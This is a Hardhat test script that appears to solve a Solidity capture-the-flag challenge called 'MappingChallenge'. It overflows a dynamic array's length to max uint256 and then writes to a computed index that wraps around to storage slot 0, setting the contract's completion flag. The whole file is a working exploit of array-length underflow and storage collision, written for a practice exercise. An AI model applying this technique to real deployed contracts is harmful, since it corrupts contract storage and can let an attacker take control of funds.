import { assert, expect } from "chai";
import { ethers } from "hardhat";
import { utils } from "mocha";

const sleep = (timeToSleepInSecs: number) => new Promise((resolve) => {
  setTimeout(resolve, timeToSleepInSecs * 1000);
})

describe("Executing", function () {
  it("Solo hay que llamar al exploit", async function () {
    const hre = require("hardhat");
    const accounts = await hre.ethers.getSigners();
    // Attach to contracts
    const toa="0x53031154e50BF9644474DDf86995C0ECF0c949C7";
    const challengeContract = await (await ethers.getContractFactory("MappingChallenge")).attach(toa);
  
    //const toa2="0x83Dc8f0C750a462690558eB0E01aECE697971d15";
    //const exploitContract = await (await ethers.getContractFactory("exploit")).attach(toa2);
    //Hay que generar un integer overflow:

    // all of contract storage is a 32 bytes key to 32 bytes value mapping
    // first make map expand its size to cover all of this storage by setting
    // key = 2^256 - 2 => map.length = 2^256 - 2 + 1 = 2^256 - 1 = max u256
    // this bypasses bounds checking
      var tx = await challengeContract.set(
      ethers.BigNumber.from("2")
        .pow("256")
        .sub("2"),
      "0"
    )
    sleep(15);
    // map[0] value is stored at keccak(p) = keccak(1)
    // needs to be padded to a 256 bit
    const mapDataBegin = ethers.BigNumber.from(
      ethers.utils.keccak256(
        "0x0000000000000000000000000000000000000000000000000000000000000001"
      )
    )
    // need to find index at this location now that maps to 0 mod 2^256
    // i.e., 0 - keccak(1) mod 2^256 <=> 2^256 - keccak(1) as keccak(1) is in range
    const isCompleteOffset = ethers.BigNumber.from("2")
      .pow("256")
      .sub(mapDataBegin)

    tx = await challengeContract.set(isCompleteOffset, "1")
    sleep(15);
    //await challengeContract.set() //Recupero la plata
    //Validar
    expect(await challengeContract.isComplete()).to.be.true;
  });
});